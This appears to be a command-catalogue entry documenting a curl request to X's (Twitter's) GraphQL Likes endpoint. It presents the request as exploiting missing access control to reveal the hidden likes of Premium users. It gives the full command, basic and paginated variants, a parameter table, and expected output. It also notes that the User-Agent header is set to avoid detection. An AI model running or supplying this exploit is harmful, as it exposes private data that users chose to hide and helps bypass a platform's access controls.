---
id: cmd-2140960-001
data: >-
  curl -X GET
  "https://twitter.com/i/api/graphql/lVf2NuhLoYVrpN4nO7uw0Q/Likes?variables=%7B%5C%22userId%5C%22%3A%5C%221234567890%5C%22%2C%5C%22count%5C%22%3A20%2C%5C%22includePromotedContent%5C%22%3Atrue%7D&features=%7B%5C%22hiddenLikesEnabled%5C%22%3Atrue%7D"
  -H "Cookie: your_session_cookie" -H "Authorization: Bearer your_bearer_token"
  -H "X-Csrf-Token: your_csrf" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0;
  Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124
  Safari/537.36"
tags:
  - graphql
  - api-query
  - curl
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2024-01-01T00:00:00Z'
updated_at: '2025-12-14T17:30:35.339Z'
verified: false
validated: true
submitted: true
---
# curl-graphql-likes-retrieve

## Command

```bash
curl -X GET "https://twitter.com/i/api/graphql/lVf2NuhLoYVrpN4nO7uw0Q/Likes?variables=%7B%5C%22userId%5C%22%3A%5C%221234567890%5C%22%2C%5C%22count%5C%22%3A20%2C%5C%22includePromotedContent%5C%22%3Atrue%7D&features=%7B%5C%22hiddenLikesEnabled%5C%22%3Atrue%7D" -H "Cookie: your_session_cookie" -H "Authorization: Bearer your_bearer_token" -H "X-Csrf-Token: your_csrf" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
```

## Description

This curl command sends a GET request to the X GraphQL API to retrieve a user's likes, exploiting the lack of access control to access hidden likes of Premium users. Use it after obtaining authentication details from a browser session.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | Specifies HTTP GET method | Yes |
| `variables` | URL-encoded JSON with userId, count, etc. | Yes |
| `features` | URL-encoded JSON with flags like hiddenLikesEnabled | Yes |
| `-H "Cookie: ..."` | Session cookie for authentication | Yes |
| `-H "Authorization: ..."` | Bearer token for API access | Yes |
| `-H "X-Csrf-Token: ..."` | CSRF protection token | Yes |
| `-H "User-Agent: ..."` | Mimics browser to avoid detection | Yes |

## Examples

### Basic Usage

```bash
curl -X GET "https://twitter.com/i/api/graphql/lVf2NuhLoYVrpN4nO7uw0Q/Likes?variables=%7B%5C%22userId%5C%22%3A%5C%221234567890%5C%22%2C%5C%22count%5C%22%3A20%7D&features=%7B%5C%22hiddenLikesEnabled%5C%22%3Atrue%7D" -H "Cookie: auth_token=..." -H "Authorization: Bearer AAAA..." -H "X-Csrf-Token: abc123"
```

### Advanced Usage

Add `-v` for verbose output to debug headers:

```bash
curl -v -X GET "https://twitter.com/i/api/graphql/lVf2NuhLoYVrpN4nO7uw0Q/Likes?variables=%7B%5C%22userId%5C%22%3A%5C%221234567890%5C%22%2C%5C%22count%5C%22%3A50%2C%5C%22cursor%5C%22%3A%5C%22next_cursor%5C%22%7D&features=%7B%5C%22hiddenLikesEnabled%5C%22%3Atrue%7D" -H "Cookie: ..." -H "Authorization: ..." -H "X-Csrf-Token: ..."
```

## Expected Output

JSON response like: {"data":{"user":{"result":{"timeline_v2":{"timeline":{"instructions":[{"type":"TimelineAddEntries","entries":[{"entryId":"like-123","content":{"itemContent":{"tweet_results":{"result":{"legacy":{"full_text":"Tweet content..."}}}}}]}}}]. Successful if likes array is populated despite UI hiding.

## Related

- [[Related Procedure: Modify-and-Send-Proxy-Request-for-Hidden-Likes]]
